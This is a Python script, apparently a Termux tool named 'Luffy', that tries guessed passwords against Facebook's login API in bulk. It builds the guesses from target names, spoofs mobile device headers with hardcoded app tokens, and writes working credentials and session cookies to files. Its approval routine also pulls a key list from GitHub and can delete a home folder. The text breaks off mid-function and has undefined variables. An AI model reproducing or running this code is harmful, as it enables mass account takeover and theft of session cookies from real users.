#-*-coding:utf-8-*-
#!/usr/bin/python
#Written by SAKINxLUFFY
#DATE = Feb 23 2024
#══════════════════════════════════════════════════════════
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[0;31m"
green="\x1b[0;32m"
yelloww="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;41m"
pvt = "\033[1;0m"

###########wash = os.system("pk"+"g u"+"nins"+"tall"+" py"+"th"+"on -y;"+"pkg "+"insta"+"ll "+"p"+"ytho"+"n-pip -"+"y;p"+"ip u"+"nins"+"tall py"+"cu"+"rl re"+"que"+"sts ch"+"ar"+"det ur"+"lli"+"b3 id"+"na cer"+"tifi -y > /"+"dev/"+"nul"+"l;pi"+"p ins"+"tall p"+"yc"+"url ch"+"ardet ur"+"llib"+"3 id"+"na ce"+"rti"+"fi req"+"ues"+"ts > /d"+"ev"+"/nu"+"ll")
#══════════════════════════════════════════════════════════


import subprocess
import os,sys,time
import pycurl
from io import BytesIO
from datetime import datetime
import subprocess,shutil,requests 
os.system('clear')
print('Installing Modules....')
time.sleep(1)
try:
    import certifi
except:
    os.system("pip install certifi > /dev/null")
    import certifi    
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n  installing bs4 ...\n')
    os.system('pip install bs4')
#══════════════════════════════════════════════════════════
#approval
def link():
    try:
        url="https://raw"+".github"+"user"+"cont"+"ent.co"+"m/VI"+"PER-"+"143"+"/SS"+"B-"+"FREE/m"+"ain/"+"Aprval.txt"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8').splitlines()[0]
        return datax
    except:
        reload()
        sys.exit("[!!] Internet Error...")
#══════════════════════════════════════════════════════════        
import uuid
myid = uuid.uuid4().hex[:40].upper()
idmy = uuid.uuid4().hex[:6].upper()
try:
    generate = open('/data/data/com.termux/files/usr/lib/.myluffy.txt','r').read()
except:
    getx = open('/data/data/com.termux/files/usr/lib/.myluffy.txt','w')
    getx.write(myid+idmy)
    getx.close()
MY_KEY = open('/data/data/com.termux/files/usr/lib/.myluffy.txt','r').read()

#══════════════════════════════════════════════════════════
####version###
def live():
    try:
        url="https://raw"+".github"+"user"+"cont"+"ent.co"+"m/VI"+"PER-"+"143"+"/SS"+"B-"+"FREE/m"+"ain/"+"Version.txt"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8').splitlines()[0]
        return datax
    except:
        reload()
        sys.exit("[!!] Internet Error...")
        
version= live()

import re,platform, sys, random,base64,uuid,zlib,re,uuid,shutil,time,sys,random,time,re,platform,string,time,re,random,sys,string,uuid,json,zlib
from concurrent.futures import ThreadPoolExecutor as tred
from string import * 
import os,sys
import hashlib
import platform
import bs4
from time import sleep as slp
import platform
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    ahydra = output.replace(',', '|').replace('\n', '')
except Exception as e:
    pass
    ahydra = None
#══════════════════════════════════════════════════════════

logox=(f"""{green}
  db      db    db d88888b d88888b db    db 
  88      88    88 88'     88'     `8b  d8' 
  88      88    88 88ooo   88ooo    `8bd8'  
  88      88    88 88~~~   88~~~      88    
  88booo. 88b  d88 88      88         88    
  Y88888P ~Y8888P' YP      YP         YP    
\033[2m{green}───────────────────────────────────────────
\033[2m{green} [{rad}+{green}] AUTHOR    >> {rad}SAKINXD
\033[2m{green} [{rad}+{green}] STATUS    >> {rad}FREE
 \033[2m{green}[{rad}+{green}] GITHUB    >> {rad}null
 ───────────────────────────────────────────""")

#══════════════════════════════════════════════════════════
def logo():
	os.system('clear')	
	print(logo)
logo=(f"""\033[2m{green}
  db      db    db d88888b d88888b db    db 
  88      88    88 88'     88'     `8b  d8' 
  88      88    88 88ooo   88ooo    `8bd8'  
  88      88    88 88~~~   88~~~      88    
  88booo. 88b  d88 88      88         88    
  Y88888P ~Y8888P' YP      YP         YP    
\033[2m{green}───────────────────────────────────────────
\033[2m{green} [{rad}+{green}] AUTHOR    >> {rad}SAKINXD
\033[2m{green} [{rad}+{green}] STATUS    >> {rad}FREE
 \033[2m{green}[{rad}+{green}] VERSION   >> {version} {green}
 ───────────────────────────────────────────
NAME >> {rad} {name}  \x1b[0;33m| {green}EXP >> {rad}{EXP}
\033[2m{green}───────────────────────────────────────────""")

def line():
    print(f'\033[2m{green}───────────────────────────────────────────{green}')
loop=0
oks=[]
cps=[]
ck=[]
def clear():
    os.system('clear')
    print(logo)
    
def reload():
    try:
        shutil.rmtree("/data/data/com.termux/files/home/luffy")
    except:
        sys.exit()
       

#══════════════════════════════════════════════════════════
def apv_check():	
  id = f'{MY_KEY}'
  os.system("clear")
  print(logox)
  try: 
    httpCaht = link() 
    if id in httpCaht: 
      print(f'{green} [{rad}+{green}] CHECKING DEVICE APPROVAL....')
      time.sleep(4)
      print(f'{green} [{rad}+{green}] YOUR KEY IS APPROVED')
      time.sleep(1)
      line()
      pass 
    else: 
      print(f'\033[2m{green} [{rad}+{green}] KEY {rad}>> {MY_KEY} ')
      line()
      print(f'\033[2m{green}{rad}{green}{rad}FREE TOOL BUT YOU NEED APPROVAL TO USE')
      line()
      url_wa = "https://api.whatsapp.com/send?phone=+8801844742905&text="
      name = input(f"\033[2m{green} [{rad}+{green}] Enter your Name {green}: ")
      line()
      tks = ("Hi Sakin Sir, I Need to Approval Your Luffy Tools Please Approve My Key :)\n\n Name :- "+name+"\n Key :- "+id)
      subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     apv_check()
apv_check()

def luffy():
		clear()
		print(f'\033[2m [{rad}1{green}] RANDOM CLONE')
		print(f' \033[2m[{rad}2{green}] FILE CLONE')
		print(f'\033[2m [{rad}3{green}] CONTACT ADMIN')
		print(f' \033[2m[{rad}4{green}] Exit')
		line()
		luffy = input(f' \033[2m[{rad}?{green}] CHOICE: ');line()
		if luffy in ['1']:RANDOM()
		elif luffy in ['2']:luffy_file()
		elif luffy in ['3']:os.system('xdg-open https://www.facebook.com/itz.Meh.Your.Dad')
		elif luffy in ['4']:sys.exit()
		else:main.luffy()	
			
def rmpassconf(num,type):
        if 'first' in type:
            try:
                code = type.split('t')[1]
                password = num[:int(code)]
            except:
                password = num
        elif 'last' in type:
            try:
                code = type.split('t')[1]
                password = num[-int(code):]
            except:
                password = num
        else:
            password = type
        return password
#═════════════════════════════════════════#
def luffy_file():
    clear()
    file = input(f'\033[2m [{rad}+{green}] PUT FILE: ');line()
    try:fo = open(file,'r').read().splitlines()
    except FileNotFoundError:luffy_file()
    rng = input(f'\033[2m [{rad}+{green}] Password limit {green}:{rad} ')
    clear()
    plist=[]
    for i in range(int(rng)):
        print(f'\033[2m [{rad}+{green}] EXAMPLE {rad} last6,first8,first6, etc');line()
        plist.append(input(f'\033[2m [{rad}+{green}] Put password {i + 1}:{rad} '));clear()
    print(f"\033[2m [1] METHOD 1\n [2] METHOD 2\n [3] METHOD 3\n [4] METHOD 4")
    line()
    mthd = input(' Choice: ')
    with tred(max_workers=30) as luffy:
        sl= str(len(fo))
        clear()
        print(f' \033[2m[{rad}+{green}] TOTAL ID  {yelloww}: {white}{sl}')
        print(f' \033[2m[{rad}+{green}] METHOD    {yelloww}:{white} {mthd} ')
        print(f' \033[2m[{rad}+{green}] IF NO RESULT {rad}[{yelloww}ON{white}/{yelloww}OFF{rad}] {green}AIRPLANE MODE')
        line()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if mthd in ['1','A']:luffy.submit(crack_file_A,ids,names,passlist)
            elif mthd in ['2','B']:luffy.submit(crack_file_B,ids,names,passlist)
            elif mthd in ['3','C']:luffy.submit(crack_file_C,ids,names,passlist)
            elif mthd in ['4','D']:luffy.submit(crack_file_D,ids,names,passlist)
#═════════════════════════════════════════#
def crack_file_A(ids,names,passlist):
        try:
                global ok,loop,sim_id
                asvs = random.choice(["\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;86m"])
                ass = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;96m","\033[1;97m"])
                sys.stdout.write(f'\r \x1b[1;90m[{asvs}BLACK-M1\x1b[1;90m]-[{ass}%s\x1b[1;90m]-[{G}OK:%s\x1b[1;90m]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        #ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/426.0.0.87.92;FBBV/399592918;FBRV/0;FBPN/com.facebook.katana;FBLC/hi_IN;FBMF/motorola;FBBD/motorola;FBDV/motorola;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        ua = 'Dalvik/2.1.0 (Linux; U; Android 11; TECNO L6502S Build/QP1A.217514.380) [FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=3.0,width=1080,height=1806};FBLC/en_US;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/Phantom6;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                       # ua = f"[FBAN/Orca-Android;FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/Orca-Android;FBAV/120.0.0.56.124;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209027753;FBCR/Jio 4G;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2239;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1412};]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sm=['GT-', 'SM-']
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI':str(random.randint(20000, 40000)),
'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;30m[\033[1;32mBLACK-OK\033[1;30m]\033[1;32m '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/BLACK-FILE-COOKI-M1-OK.txt','a').write(ids+' | '+pas+' | '+coki+'\n')
                                        open('/sdcard/BLACK-FILE-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print(f'\r\r \033[1;96m[BLACK-2F] '+ids+' | '+pas+'\033[1;97m')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;214m [BLACK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BLACK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BLACK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass               
#═════════════════════════════════════════#
def crack_file_B(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            cl = random.choice([f'\033[1;91m','\x1b[38;5;220m','\033[1;94m','\033[1;95m','\033[1;96m','\x1b[38;5;49m','\x1b[38;5;208m'])
            sys.stdout.write(f'\r\r\033[1;37m <[{clr}LUFFY-M2\033[1;37m]>×<[{loop}|\033[1;32m{len(oks)}\033[1;37m]> \033[1;37m');sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; TECNO L6502S Build/QP1A.217514.380) [FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=3.0,width=1080,height=1806};FBLC/en_US;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/Phantom6;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-api.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:            	
                print('\r\r\033[1;32m <[LUFFY-OK]> '+ids+' | '+pas)
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print(f"\r\r\033[1;32m <[🍪]>\033[1;37m {coki}")
                oks.append(ids)
                open('/sdcard/LUFFY-R-OK.txt','a').write(ids+'|'+pas+'\n')
                open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(idx+'|'+pas+'|'+cookie+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:            
                open('/sdcard/SCARLET-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass        
#═════════════════════════════════════════#
def crack_file_C(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            cl = random.choice([f'\033[1;91m','\x1b[38;5;220m','\033[1;94m','\033[1;95m','\033[1;96m','\x1b[38;5;49m','\x1b[38;5;208m'])
            sys.stdout.write(f'\r\r\033[1;37m <[{clr}LUFFY-M1\033[1;37m]>×<[{loop}|\033[1;32m{len(oks)}\033[1;37m]> \033[1;37m');sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; TECNO L6502S Build/QP1A.217514.380) [FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=3.0,width=1080,height=1806};FBLC/en_US;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/Phantom6;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
